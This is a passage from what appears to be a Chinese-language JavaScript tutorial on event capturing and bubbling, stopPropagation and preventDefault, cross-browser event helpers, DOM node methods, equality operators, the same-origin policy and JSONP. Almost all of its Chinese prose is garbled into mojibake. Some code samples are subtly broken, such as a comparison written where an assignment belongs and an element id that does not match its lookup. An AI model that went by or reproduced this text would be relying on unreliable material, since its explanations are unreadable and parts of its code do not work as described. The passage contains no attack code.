console.log(target.tagName);&#125; ç‚¹å‡» html ä¸­çš„å†’æ³¡/æ•èŽ·ï¼Œå¯ä»¥å¾—åˆ°ä¸‹é¢çš„ç»“æžœ 12345678910capturing&amp;bubbling phase.html:36 HTMLcapturing&amp;bubbling phase.html:36 BODYcapturing&amp;bubbling phase.html:36 DIVcapturing&amp;bubbling phase.html:36 ULcapturing&amp;bubbling phase.html:36 LIcapturing&amp;bubbling phase.html:40 LIcapturing&amp;bubbling phase.html:40 ULcapturing&amp;bubbling phase.html:40 DIVcapturing&amp;bubbling phase.html:40 BODYcapturing&amp;bubbling phase.html:40 HTML æ€»ç»“å°±æ˜¯å…ˆæ•èŽ·ï¼ŒåŽå†’æ³¡ï¼Œæ•èŽ·æ˜¯ä»Žä¸Šåˆ°ä¸‹ï¼Œå†’æ³¡æ˜¯ä»Žä¸‹åˆ°ä¸Šã€‚ï¼ˆå½¢è±¡è¯´æ³•ï¼šæ•èŽ·åƒçŸ³å¤´æ²‰å…¥æµ·åº•ï¼Œå†’æ³¡åƒæ°”çƒå†’å‡ºæ°´é¢ï¼‰ åŽ»æŽ‰ å‡½æ•° bubblingCallback ä¸­çš„ e.stopPropagation()çš„æ³¨é‡Šï¼Œåˆ™åªä¼šè¿›è¡Œæ•èŽ·ï¼Œè¾“å‡º 123456capturing&amp;bubbling phase.html:40 HTMLcapturing&amp;bubbling phase.html:40 BODYcapturing&amp;bubbling phase.html:40 DIVcapturing&amp;bubbling phase.html:40 ULcapturing&amp;bubbling phase.html:40 LIcapturing&amp;bubbling phase.html:45 LI è€Œå–æ¶ˆ å‡½æ•° captureCallbackä¸­çš„ e.stopPropagation() æ³¨é‡Šï¼Œåˆ™åªæ•èŽ·åˆ° æœ€ä¸Šé¢çš„æ ‡ç­¾ 1capturing&amp;bubbling phase.html:40 HTML é€šè¿‡ä¸Šé¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œ event.stopPropagation()ï¼Œå¯ä»¥é˜»æ­¢ æ•èŽ·å’Œå†’æ³¡é˜¶æ®µå½“å‰äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ æ’­ã€‚ è§„åˆ™ï¼š åœ¨å†’æ³¡äº‹ä»¶å’Œæ•èŽ·äº‹ä»¶åŒæ—¶å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæ•èŽ·äº‹ä»¶ä¼˜å…ˆçº§é«˜ä¸€ç‚¹ åœ¨åŒä¸€ä¸ªå…ƒç´ çš„ç»‘å®šäº‹ä»¶ä¸­ï¼Œå†’æ³¡å’Œæ•èŽ·æ²¡æœ‰æ¬¡åºä¹‹åˆ†ï¼Œéµå¾ªJavascriptçš„æ‰§è¡Œé¡ºåºã€‚ åœ¨å…ƒç´ ä¸ŠåŒæ—¶ç»‘å®šæ•èŽ·äº‹ä»¶å’Œå†’æ³¡äº‹ä»¶ï¼Œå¦‚æžœé€šè¿‡æ­¤å…ƒç´ çš„å­çº§å…ƒç´ è§¦å‘ï¼Œåˆ™ä¼˜å…ˆè§¦å‘æ•èŽ·äº‹ä»¶ï¼Œè‹¥ä¸é€šè¿‡æ­¤å…ƒç´ çš„å­çº§å…ƒç´ è§¦å‘ï¼Œåˆ™æŒ‰ç…§Javascriptæ‰§è¡Œé¡ºåºè§¦å‘ã€‚ äº‹ä»¶ä¸åŒæµè§ˆå™¨å¤„ç†å‡½æ•° element.addEventListener(type, listener[, useCapture]); // IE6~8ä¸æ”¯æŒï¼ˆæ•èŽ·å’Œå†’æ³¡é€šè¿‡useCapture,é»˜è®¤falseï¼‰ element.attachEvent(â€™onâ€™ + type, listener); // IE6~10ï¼ŒIE11ä¸æ”¯æŒ(åªæ‰§è¡Œå†’æ³¡äº‹ä»¶) element[â€™onâ€™ + type] = function(){} // æ‰€æœ‰æµè§ˆå™¨ï¼ˆé»˜è®¤æ‰§è¡Œå†’æ³¡äº‹ä»¶ï¼‰ -äº‹ä»¶ä¸åŒæµè§ˆå™¨å¤„ç†å‡½æ•°.png) W3C ä¸­å®šä¹‰äº† 3ä¸ªäº‹ä»¶é˜¶æ®µï¼Œä¾æ¬¡æ˜¯æ•èŽ·é˜¶æ®µã€ç›®æ ‡é˜¶æ®µã€å†’æ³¡é˜¶æ®µã€‚äº‹ä»¶å¯¹è±¡æŒ‰ç…§ä¸Šå›¾çš„ä¼ æ’­è·¯å¾„ä¾æ¬¡å®Œæˆè¿™äº›é˜¶æ®µã€‚å¦‚æžœæŸä¸ªé˜¶æ®µä¸æ”¯æŒæˆ–äº‹ä»¶å¯¹è±¡çš„ä¼ æ’­è¢«ç»ˆæ­¢ï¼Œé‚£ä¹ˆè¯¥é˜¶æ®µå°±ä¼šè¢«è·³è¿‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æžœEvent.bubbleså±žæ€§è¢«è®¾ç½®ä¸ºfalseï¼Œé‚£ä¹ˆå†’æ³¡é˜¶æ®µå°±ä¼šè¢«è·³è¿‡ã€‚å¦‚æžœEvent.stopPropagation()åœ¨äº‹ä»¶æ´¾å‘å‰è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„é˜¶æ®µéƒ½ä¼šè¢«è·³è¿‡ã€‚ æ•èŽ· é˜¶æ®µï¼šåœ¨äº‹ä»¶å¯¹è±¡åˆ°è¾¾äº‹ä»¶ç›®æ ‡ä¹‹å‰ï¼Œäº‹ä»¶å¯¹è±¡å¿…é¡»ä»Ž window ç»è¿‡ç›®æ ‡çš„ç¥–å…ˆèŠ‚ç‚¹ä¼ æ’­åˆ°äº‹ä»¶ç›®æ ‡ã€‚è¿™ä¸ªé˜¶æ®µè¢«æˆ‘ä»¬ç§°ä¸ºæ•èŽ·é˜¶æ®µï¼Œåœ¨è¿™ä¸ªé˜¶æ®µæ³¨å†Œçš„äº‹ä»¶ç›‘å¬å™¨åœ¨äº‹ä»¶åˆ°è¾¾å…¶ç›®æ ‡å‰å¿…é¡»å…ˆå¤„ç†äº‹ä»¶ã€‚ ç›®æ ‡ é˜¶æ®µï¼šäº‹ä»¶å¯¹è±¡åˆ°è¾¾å…¶äº‹ä»¶ç›®æ ‡ï¼Œè¿™ä¸ªé˜¶æ®µè¢«æˆ‘ä»¬ç§°ä¹‹ä¸ºç›®æ ‡é˜¶æ®µã€‚ä¸€æ—¦äº‹ä»¶å¯¹è±¡è¾¾åˆ°äº‹ä»¶ç›®æ ‡ï¼Œè¯¥é˜¶æ®µçš„äº‹ä»¶ç›‘å¬å™¨å°±è¦å¯¹å®ƒè¿›è¡Œå¤„ç†ã€‚å¦‚æžœä¸€ä¸ªäº‹ä»¶å¯¹è±¡ç±»åž‹è¢«æ ‡å¿—ä¸ºä¸èƒ½å†’æ³¡ã€‚é‚£ä¹ˆå¯¹åº”çš„äº‹ä»¶å¯¹è±¡åœ¨åˆ°æ­¤é˜¶æ®µæ—¶å°±ä¼šç»ˆæ­¢ä¼ æ’­ã€‚ å†’æ³¡ é˜¶æ®µï¼šäº‹ä»¶å¯¹è±¡ä»¥ä¸€ä¸ªä¸Žæ•èŽ·é˜¶æ®µç›¸åçš„æ–¹å‘ä»Žäº‹ä»¶ç›®æ ‡ä¼ æ’­ç»è¿‡å…¶ç¥–å…ˆèŠ‚ç‚¹ä¼ æ’­åˆ° windowï¼Œè¿™ä¸ªé˜¶æ®µè¢«ç§°ä¹‹ä¸ºå†’æ³¡é˜¶æ®µï¼Œåœ¨æ­¤é˜¶æ®µæ³¨å†Œçš„äº‹ä»¶ç›‘å¬å™¨ä¼šå¯¹åº”çš„å†’æ³¡äº‹ä»¶è¿›è¡Œå¤„ç† åœ¨ä¸€ä¸ªäº‹ä»¶å®Œæˆäº†æ‰€æœ‰é˜¶æ®µçš„ä¼ æ’­è·¯å¾„åŽï¼Œå®ƒçš„Event.currentTargetä¼šè¢«è®¾ç½®ä¸ºnullå¹¶ä¸”Event.eventPhaseä¼šè¢«è®¾ä¸º0ã€‚Eventçš„æ‰€æœ‰å…¶ä»–å±žæ€§éƒ½ä¸ä¼šæ”¹å˜ï¼ˆåŒ…æ‹¬æŒ‡å‘äº‹ä»¶ç›®æ ‡çš„Event.targetå±žæ€§ï¼‰ è·¨æµè§ˆå™¨çš„äº‹ä»¶å¤„ç†å‡½æ•° 123456789101112131415161718192021var EventUtil = &#123; addHandler: function(element, type, handler) &#123; if (element.addEventListener) &#123; // DOM2 element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; // IE element.attachEvent('on' + type, handler); &#125; else &#123; // DOM0 element['on' + type] = handler; &#125; &#125;, removeHandler: function(element, type, handler) &#123; if (element.removeEventListener) &#123; element.removeEventListener(type, handler, false); &#125; else if (element.detachEvent) &#123; element.detachEvent('on' + type, handler); &#125; else &#123; element['on' + type] = null; &#125; &#125;&#125;; è·¨æµè§ˆå™¨çš„äº‹ä»¶å¯¹è±¡ï¼š 12345678910111213141516171819202122232425var EventUtil = &#123; getEvent: function(e) &#123; return e ? e : window.e; &#125;, getTarget: function(e) &#123; return e.target || e.srcElement; &#125;, preventDefault: function(e) &#123; if (e.preventDefault) &#123; e.preventDefault(); &#125; else &#123; e.returnValue = false; &#125; &#125;, stopPropagation: function(e) &#123; if (e.stopPropagation) &#123; e.stopPropagation() &#125; else &#123; e.cancelBubble = true; &#125; &#125;&#125; jså†’æ³¡å’Œæ•èŽ·æ˜¯äº‹ä»¶çš„ä¸¤ç§è¡Œä¸ºï¼Œä½¿ç”¨event.stopPropagation()èµ·åˆ°é˜»æ­¢æ•èŽ·å’Œå†’æ³¡é˜¶æ®µä¸­å½“å‰äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ æ’­ã€‚ä½¿ç”¨event.preventDefault()å¯ä»¥å–æ¶ˆé»˜è®¤äº‹ä»¶ã€‚ é˜²æ­¢å†’æ³¡å’Œæ•èŽ· w3cçš„æ–¹æ³•æ˜¯e.stopPropagation()ï¼ŒIEåˆ™æ˜¯ä½¿ç”¨e.cancelBubble = true topPropagationä¹Ÿæ˜¯äº‹ä»¶å¯¹è±¡(Event)çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä½œç”¨æ˜¯é˜»æ­¢ç›®æ ‡å…ƒç´ çš„å†’æ³¡äº‹ä»¶ï¼Œä½†æ˜¯ä¼šä¸é˜»æ­¢é»˜è®¤è¡Œä¸ºã€‚ä»€ä¹ˆæ˜¯å†’æ³¡äº‹ä»¶ï¼Ÿå¦‚åœ¨ä¸€ä¸ªæŒ‰é’®æ˜¯ç»‘å®šä¸€ä¸ªâ€clickâ€äº‹ä»¶ï¼Œé‚£ä¹ˆâ€clickâ€äº‹ä»¶ä¼šä¾æ¬¡åœ¨å®ƒçš„çˆ¶çº§å…ƒç´ ä¸­è¢«è§¦å‘ã€‚stopPropagationå°±æ˜¯é˜»æ­¢ç›®æ ‡å…ƒç´ çš„äº‹ä»¶å†’æ³¡åˆ°çˆ¶çº§å…ƒç´ ã€‚å¦‚ï¼š 123456&lt;div id='div' onclick='alert("div");'&gt; &lt;ul onclick='alert("ul");'&gt; &lt;li onclick='alert("li");'&gt;test&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; å•å‡»æ—¶ï¼Œä¼šä¾æ¬¡è§¦å‘alert(â€œliâ€),alert(â€œulâ€),alert(â€œdivâ€)ï¼Œè¿™å°±æ˜¯äº‹ä»¶å†’æ³¡ã€‚ é˜»æ­¢å†’æ³¡ 1window.event? window.event.cancelBubble = true : e.stopPropagation(); å–æ¶ˆé»˜è®¤äº‹ä»¶ w3cçš„æ–¹æ³•æ˜¯e.preventDefault()ï¼ŒIEåˆ™æ˜¯ä½¿ç”¨e.returnValue = false preventDefaultå®ƒæ˜¯äº‹ä»¶å¯¹è±¡(Event)çš„ä¸€ä¸ªæ–¹æ³•ï¼Œä½œç”¨æ˜¯å–æ¶ˆä¸€ä¸ªç›®æ ‡å…ƒç´ çš„é»˜è®¤è¡Œä¸ºã€‚æ—¢ç„¶æ˜¯è¯´é»˜è®¤è¡Œä¸ºï¼Œå½“ç„¶æ˜¯å…ƒç´ å¿…é¡»æœ‰é»˜è®¤è¡Œä¸ºæ‰èƒ½è¢«å–æ¶ˆï¼Œå¦‚æžœå…ƒç´ æœ¬èº«å°±æ²¡æœ‰é»˜è®¤è¡Œä¸ºï¼Œè°ƒç”¨å½“ç„¶å°±æ— æ•ˆäº†ã€‚ä»€ä¹ˆå…ƒç´ æœ‰é»˜è®¤è¡Œä¸ºå‘¢ï¼Ÿå¦‚é“¾æŽ¥&amp;lt;a&amp;gt;ï¼Œæäº¤æŒ‰é’® &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt; ç­‰ã€‚å½“Event å¯¹è±¡çš„cancelableä¸ºfalseæ—¶ï¼Œè¡¨ç¤ºæ²¡æœ‰é»˜è®¤è¡Œä¸ºï¼Œè¿™æ—¶å³ä½¿æœ‰é»˜è®¤è¡Œä¸ºï¼Œè°ƒç”¨preventDefaultä¹Ÿæ˜¯ä¸ä¼šèµ·ä½œç”¨çš„ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œé“¾æŽ¥ &amp;lt;a&amp;gt; çš„é»˜è®¤åŠ¨ä½œå°±æ˜¯è·³è½¬åˆ°æŒ‡å®šé¡µé¢ï¼Œä¸‹é¢å°±ä»¥å®ƒä¸ºä¾‹ï¼Œé˜»æ­¢å®ƒçš„è·³è½¬ï¼š 123456789//å‡å®šæœ‰é“¾æŽ¥&lt;a href="http://laibh.top/" id="testA" &gt;laibh.top&lt;/a&gt;var a = document.getElementById("test");a.onclick =function(e)&#123;if(e.preventDefault)&#123; e.preventDefault(); &#125;else&#123; window.event.returnValue == false; &#125;&#125; return false javascriptçš„return falseåªä¼šé˜»æ­¢é»˜è®¤è¡Œä¸ºï¼Œè€Œæ˜¯ç”¨jQueryçš„è¯åˆ™æ—¢é˜»æ­¢é»˜è®¤è¡Œä¸ºåˆé˜²æ­¢å¯¹è±¡å†’æ³¡ ä¸‹é¢è¿™ä¸ªä½¿ç”¨åŽŸç”Ÿjsï¼Œåªä¼šé˜»æ­¢é»˜è®¤è¡Œä¸ºï¼Œä¸ä¼šåœæ­¢å†’æ³¡ 1234567891011&lt;div id='div' onclick='alert("div");'&gt;&lt;ul onclick='alert("ul");'&gt; &lt;li id='ul-a' onclick='alert("li");'&gt;&lt;a href="http://caibaojian.com/"id="testB"&gt;caibaojian.com&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;script&gt; var a = document.getElementById("testB"); a.onclick = function()&#123; return false; &#125;;&lt;/script&gt; æ€»ç»“ä½¿ç”¨æ–¹æ³• å½“éœ€è¦åœæ­¢å†’æ³¡è¡Œä¸ºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ 123456789function stopBubble(e) &#123; //å¦‚æžœæä¾›äº†äº‹ä»¶å¯¹è±¡ï¼Œåˆ™è¿™æ˜¯ä¸€ä¸ªéžIEæµè§ˆå™¨ if ( e &amp;&amp; e.stopPropagation ) //å› æ­¤å®ƒæ”¯æŒW3Cçš„stopPropagation()æ–¹æ³• e.stopPropagation(); else //å¦åˆ™ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨IEçš„æ–¹å¼æ¥å–æ¶ˆäº‹ä»¶å†’æ³¡ window.event.cancelBubble = true; &#125; å½“éœ€è¦é˜»æ­¢é»˜è®¤è¡Œä¸ºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ 12345678910//é˜»æ­¢æµè§ˆå™¨çš„é»˜è®¤è¡Œä¸º function stopDefault( e ) &#123; //é˜»æ­¢é»˜è®¤æµè§ˆå™¨åŠ¨ä½œ(W3C) if ( e &amp;&amp; e.preventDefault ) e.preventDefault(); //IEä¸­é˜»æ­¢å‡½æ•°å™¨é»˜è®¤åŠ¨ä½œçš„æ–¹å¼ else window.event.returnValue = false; return false; &#125; äº‹ä»¶æ³¨æ„ç‚¹ eventä»£è¡¨äº‹ä»¶çš„çŠ¶æ€ï¼Œä¾‹å¦‚è§¦å‘eventå¯¹è±¡çš„å…ƒç´ ã€é¼ æ ‡çš„ä½ç½®åŠçŠ¶æ€ã€æŒ‰ä¸‹çš„é”®ç­‰ç­‰ï¼› eventå¯¹è±¡åªåœ¨äº‹ä»¶å‘ç”Ÿçš„è¿‡ç¨‹ä¸­æ‰æœ‰æ•ˆã€‚ firefoxé‡Œçš„eventè·ŸIEé‡Œçš„ä¸åŒï¼ŒIEé‡Œçš„æ˜¯å…¨å±€å˜é‡ï¼Œéšæ—¶å¯ç”¨ï¼›firefoxé‡Œçš„è¦ç”¨å‚æ•°å¼•å¯¼æ‰èƒ½ç”¨ï¼Œæ˜¯è¿è¡Œæ—¶çš„ä¸´æ—¶å˜é‡ã€‚åœ¨IE/Operaä¸­æ˜¯window.eventï¼Œåœ¨Firefoxä¸­æ˜¯eventï¼›è€Œäº‹ä»¶çš„å¯¹è±¡ï¼Œåœ¨IEä¸­æ˜¯window.event.srcElementï¼Œåœ¨Firefoxä¸­æ˜¯event.targetï¼ŒOperaä¸­ä¸¤è€…éƒ½å¯ç”¨ã€‚ 123456 function a(e)&#123; var e = (e) ? e : ((window.event) ? window.event : null); var e = e || window.event; // firefoxä¸‹window.eventä¸ºnull, IEä¸‹eventä¸ºnull&#125; æŸ¥æ‰¾ æ·»åŠ  åˆ é™¤ æ›¿æ¢ æ’å…¥åˆ°æŸä¸ªèŠ‚ç‚¹çš„æ–¹æ³•1234567891011121314151617181920212223242526// æŸ¥æ‰¾èŠ‚ç‚¹document.getElementById('id'); // é€šè¿‡idæŸ¥æ‰¾ï¼Œè¿”å›žå”¯ä¸€çš„èŠ‚ç‚¹ï¼Œå¦‚æžœæœ‰å¤šä¸ªå°†ä¼šè¿”å›žç¬¬ä¸€ä¸ªï¼Œåœ¨IE6ã€7ä¸­æœ‰ä¸ªbugï¼Œä¼šè¿”å›žnameå€¼ç›¸åŒçš„å…ƒç´ ï¼Œæ‰€æœ‰è¦åšä¸€ä¸ªå…¼å®¹document.getElementsByClassName('class'); // é€šè¿‡classæŸ¥æ‰¾ï¼Œè¿”å›žèŠ‚ç‚¹æ•°ç»„document.getElementsByTagName('div'); // é€šè¿‡æ ‡ç­¾å// åˆ›å»ºèŠ‚ç‚¹document.createDocumentFragment(); // åˆ›å»ºå†…å­˜æ–‡æ¡£ç¢Žç‰‡document.createElement(); // åˆ›å»ºå…ƒç´ document.createTextNode(); // åˆ›å»ºæ–‡æœ¬èŠ‚ç‚¹// æ·»åŠ èŠ‚ç‚¹var oDiv = document.createElement('div');// æ’å…¥ Dom èŠ‚ç‚¹// æ–¹æ³•1ï¼šappendChild() æŠŠèŠ‚ç‚¹æ’å…¥åˆ°çˆ¶èŠ‚ç‚¹çš„æœ«å°¾document.body.appendChild(oDiv) // æŠŠ div æ’å…¥åˆ° body ä¸­ï¼Œå¹¶ä¸”ä½äºŽæœ«å°¾// æ–¹æ³•2ï¼šinsertBefore() æŠŠèŠ‚ç‚¹æ’å…¥åˆ°çˆ¶èŠ‚ç‚¹çš„æŸä¸ªå…„å¼ŸèŠ‚ç‚¹çš„å‰é¢var oP = createElement('p'); // åˆ›å»ºä¸€ä¸ª p èŠ‚ç‚¹document.body.insertBefore(oP,oDiv); // æŠŠ p èŠ‚ç‚¹æ’å…¥åˆ° div çš„å‰é¢// åˆ é™¤èŠ‚ç‚¹document.body.removeChild(oP); // åˆ é™¤ p èŠ‚ç‚¹// æ›¿æ¢ Dom èŠ‚ç‚¹var oSpan = document.createElement('span');document.body.replaceChild(oSpan,oBox); // ç”¨ span æ ‡ç­¾æ›¿æ¢ div æ ‡ç­¾ javaScript çš„æœ¬åœ°å¯¹è±¡ï¼Œå†…ç½®å¯¹è±¡å’Œå®¿ä¸»å¯¹è±¡å†…éƒ¨å¯¹è±¡ jsä¸­çš„å†…éƒ¨å¯¹è±¡åŒ…æ‹¬Arrayã€Booleanã€Dateã€Functionã€Globalã€Mathã€Numberã€Objectã€RegExpã€Stringä»¥åŠå„ç§é”™è¯¯ç±»å¯¹è±¡ï¼ŒåŒ…æ‹¬Errorã€EvalErrorã€RangeErrorã€ReferenceErrorã€SyntaxErrorå’ŒTypeErrorã€‚ æœ¬åœ°å¯¹è±¡ Arrayã€Booleanã€Dateã€Functionã€Numberã€Objectã€RegExpã€Stringã€Errorã€EvalErrorã€RangeErrorã€ReferenceErrorã€SyntaxErrorå’ŒTypeErrorç­‰ new å¯ä»¥å®žä¾‹åŒ– å†…ç½®å¯¹è±¡ å…¶ä¸­Globalå’ŒMathè¿™ä¸¤ä¸ªå¯¹è±¡åˆè¢«ç§°ä¸ºâ€œå†…ç½®å¯¹è±¡â€ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡åœ¨è„šæœ¬ç¨‹åºåˆå§‹åŒ–æ—¶è¢«åˆ›å»ºï¼Œä¸å¿…å®žä¾‹åŒ–è¿™ä¸¤ä¸ªå¯¹è±¡ã€‚ å®¿ä¸»å¯¹è±¡ å®¿ä¸»çŽ¯å¢ƒï¼šä¸€èˆ¬å®¿ä¸»çŽ¯å¢ƒç”±å¤–å£³ç¨‹åºåˆ›å»ºä¸Žç»´æŠ¤ï¼Œåªè¦èƒ½æä¾›jså¼•æ“Žæ‰§è¡Œçš„çŽ¯å¢ƒéƒ½å¯ç§°ä¹‹ä¸ºå¤–å£³ç¨‹åºã€‚å¦‚ï¼šwebæµè§ˆå™¨ï¼Œä¸€äº›æ¡Œé¢åº”ç”¨ç³»ç»Ÿç­‰ã€‚å³ç”±webæµè§ˆå™¨æˆ–æ˜¯è¿™äº›æ¡Œé¢åº”ç”¨ç³»ç»Ÿæ—©å°±çš„çŽ¯å¢ƒå³å®¿ä¸»çŽ¯å¢ƒã€‚ é‚£ä¹ˆå®¿ä¸»å°±æ˜¯æµè§ˆå™¨è‡ªå¸¦çš„ document ï¼Œ window ç­‰ ###== å’Œ=== çš„ä¸åŒ å‰è€…ä¼šè‡ªåŠ¨è½¬æ¢ç±»åž‹ï¼Œè€ŒåŽè€…ä¸ä¼šã€‚ æ¯”è¾ƒè¿‡ç¨‹ï¼š åŒç­‰å·==ï¼š å¦‚æžœä¸¤ä¸ªå€¼ç±»åž‹ç›¸åŒï¼Œå†è¿›è¡Œä¸‰ä¸ªç­‰å·ï¼ˆ===ï¼‰çš„æ¯”è¾ƒ å¦‚æžœä¸¤ä¸ªå€¼ç±»åž‹ä¸åŒï¼Œä¹Ÿæœ‰å¯èƒ½ç›¸ç­‰ï¼Œéœ€æ ¹æ®ä»¥ä¸‹è§„åˆ™è¿›è¡Œç±»åž‹è½¬æ¢å†æ¯”è¾ƒ å¦‚æžœä¸€ä¸ªæ˜¯ null,ä¸€ä¸ªæ˜¯ undefined é‚£ä¹ˆç›¸ç­‰ å¦‚æžœä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªæ˜¯æ•°å€¼ï¼ŒæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼ä¹‹åŽå†è¿›è¡Œæ¯”è¾ƒ ä¸‰ç­‰å· === ï¼š å¦‚æžœç±»åž‹ä¸åŒï¼Œå°±ä¸€å®šä¸ç›¸ç­‰ å¦‚æžœä¸¤ä¸ªéƒ½æ˜¯æ•°å€¼ï¼Œå¹¶ä¸”æ˜¯åŒä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆç›¸ç­‰ï¼›å¦‚æžœå…¶ä¸­è‡³å°‘ä¸€ä¸ªæ˜¯ NaN,é‚£ä¹ˆä¸ç›¸ç­‰ï¼ˆåˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯ NaN,åªèƒ½ä½¿ç”¨ isNaN() æ¥åˆ¤æ–­ï¼‰ å¦‚æžœä¸¤ä¸ªéƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªä½ç½®çš„å­—ç¬¦éƒ½ä¸€æ ·ï¼Œé‚£ä¹ˆç›¸ç­‰ï¼Œå¦åˆ™ä¸ç›¸ç­‰ å¦‚æžœä¸¤ä¸ªå€¼éƒ½æ˜¯ true,æˆ–æ˜¯ false,é‚£ä¹ˆç›¸ç­‰ å¦‚æžœä¸¤ä¸ªå€¼éƒ½å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡æˆ–è€…æ˜¯å‡½æ•°ï¼Œé‚£ä¹ˆç›¸ç­‰ï¼Œå¦åˆ™ä¸ç›¸ç­‰ å¦‚æžœä¸¤ä¸ªå€¼éƒ½æ˜¯ nullï¼Œæˆ–è€…æ˜¯ undefined é‚£ä¹ˆç›¸ç­‰ã€‚ javaScript çš„åŒæºç­–ç•¥åŒæºç­–ç•¥çš„å«ä¹‰ï¼šè„šæœ¬åªèƒ½è¯»å–å’Œæ‰€å±žæ–‡æ¡£æ¥æºç›¸åŒçš„çª—å£å’Œæ–‡æ¡£çš„å±žæ€§ã€‚ åŒæºæŒ‡çš„æ˜¯ä¸»æœºåã€åè®®å’Œç«¯å£å·çš„ç»„åˆ -åŒæºç­–ç•¥.png) åŒæºç­–ç•¥å¸¦æ¥çš„é™åˆ¶ cookieã€LocalStorage å’Œ IndexDBæ— æ³•è¯»å– DOM æ— æ³•èŽ·å– AJAXè¯·æ±‚æ— æ³•å‘é€ ä¸»æµè·¨åŸŸè¯·æ±‚è§£å†³æ–¹æ¡ˆ 1ã€JSONP å®žçŽ°è·¨åŸŸ ä¸ºäº†ä¾¿äºŽå®¢æˆ·ç«¯ä½¿ç”¨æ•°æ®ï¼Œé€æ¸å½¢æˆäº†ä¸€ç§éžæ­£å¼ä¼ è¾“åè®®ã€‚äººä»¬æŠŠå®ƒç§°ä½œJSONPã€‚è¯¥åè®®çš„ä¸€ä¸ªè¦ç‚¹å°±æ˜¯å…è®¸ç”¨æˆ·ä¼ é€’ä¸€ä¸ªcallbackå‚æ•°ç»™æœåŠ¡ç«¯ï¼Œç„¶åŽæœåŠ¡ç«¯è¿”å›žæ•°æ®æ—¶ä¼šå°†è¿™ä¸ªcallbackå‚æ•°ä½œä¸ºå‡½æ•°åæ¥åŒ…è£¹ä½JSONæ•°æ®ï¼Œè¿™æ ·å®¢æˆ·ç«¯å°±å¯ä»¥éšæ„å®šåˆ¶è‡ªå·±çš„å‡½æ•°æ¥è‡ªåŠ¨å¤„ç†è¿”å›žæ•°æ®äº†ã€‚ jsonpçš„æ ¸å¿ƒæ˜¯åŠ¨æ€æ·»åŠ  scriptæ ‡ç­¾ æ¥è°ƒç”¨æœåŠ¡å™¨æä¾›çš„jsè„šæœ¬ã€‚ è¯´è¯´JSONå’ŒJSONP JSONPå®žçŽ°åŽŸç†? JS è·¨åŸŸè¯·æ±‚èµ„æºä¼šè¢«é™åˆ¶ã€‚ä½†æ˜¯åœ¨é¡µé¢ä¸­ï¼Œscript æ ‡ç­¾è·¨åŸŸæ—¶ï¼Œå´æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼ˆframeï¼ŒimgåŒç†ï¼‰ã€‚ æˆ‘ä»¬é€šè¿‡ï¼Œscriptçš„srcå±žæ€§ï¼Œè¯·æ±‚æœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡å‚æ•°ï¼ˆå¦‚ï¼šï¼Ÿcallback=fooï¼Œfooä¸ºæœ¬åœ°ä¸€ä¸ªæ‰§è¡Œçš„æ–¹æ³•ï¼‰å‘Šè¯‰æœåŠ¡å™¨è¿”å›žæŒ‡å®šæ ¼å¼çš„JSè„šæœ¬ï¼Œå¹¶å°†æ•°æ®å°è£…åœ¨æ­¤è„šæœ¬ä¸­ã€‚ æœåŠ¡å™¨å†é…åˆå®¢æˆ·ç«¯è¿”å›žä¸€æ®µè„šæœ¬ ï¼ˆå¦‚ï¼š_ foo({â€œidâ€: 123, â€œnameâ€ : å¼ ä¸‰, â€œageâ€: 17});_ ï¼‰ï¼Œå…¶å®žè¿”å›žçš„å°±æ˜¯ ä¸€ä¸ªå®¢æˆ·ç«¯æœ¬åœ°çš„ä¸€ä¸ªå¯æ‰§è¡Œçš„æ–¹æ³•çš„æ–¹æ³•å, å¹¶å°†è¦è¿”å›žçš„ æ•°æ®å°è£…åœ¨äº†å‚æ•°é‡Œ è¯·æ±‚åˆ°èµ„æºåŽï¼Œæœ¬åœ°å°±ä¼šæ‰§è¡Œæ­¤æ–¹æ³•ï¼Œé€šè¿‡å¯¹å‚æ•°çš„å¤„ç†ï¼Œä¹Ÿå°±èŽ·å–åˆ°äº†æˆ‘ä»¬æ‰€è¦çš„æ•°æ®ã€‚ JSONPçš„å±€é™æ€§ JSONP æ–¹å¼ï¼Œå›ºç„¶æ–¹ä¾¿å¼ºå¤§ã€‚ä½†æ˜¯ä»–çš„å±€é™æ€§åœ¨äºŽï¼Œå®ƒæ— æ³•å®ŒæˆPOSTè¯·æ±‚ã€‚å³æ˜¯æˆ‘ä»¬å°†typeæ”¹ä¸ºpostï¼Œåœ¨å‘é€è¯·æ±‚æ—¶ï¼Œä¾ç„¶ä¼šæ˜¯ä»¥Getçš„æ–¹å¼ã€‚ 2ã€CORSè·¨åŸŸ CORSåŽŸç† CORSï¼ˆCross-Origin-Resource 